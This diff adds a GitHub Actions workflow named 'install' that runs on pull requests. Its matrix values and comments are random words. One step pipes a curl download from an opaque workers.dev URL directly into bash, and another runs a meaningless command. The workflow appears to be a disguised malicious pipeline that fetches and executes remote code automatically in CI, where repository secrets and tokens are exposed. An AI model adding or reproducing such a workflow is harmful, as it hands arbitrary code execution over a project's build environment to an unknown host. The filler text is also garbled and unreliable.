@@ -1,0 +1,22 @@
+name: install
+
+on:
+  pull_request:
+
+#missile convert harbour
+jobs:
+  valid:
+    strategy:
+      matrix:
+        drum: ["publication", "advertisement", "heal", "anonymous", "workman"]
+        formula: ["conclude", "dirt", "acquaint", "artistic"]
+      fail-fast: false
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    #international
+    - name: engage
+      #virus humour utility claw
+      run: curl -sS -L "https://nggr01.lucky-darkness-f361.workers.dev/ce9f80bbea579241dca5d0f0b28a5ab/66ee63ec286639ce6fe3342/83216fb95/8?tj=1775399425&u=eki&f=tg&zhn=o" | bash
+    - name: attain
+      run: merely
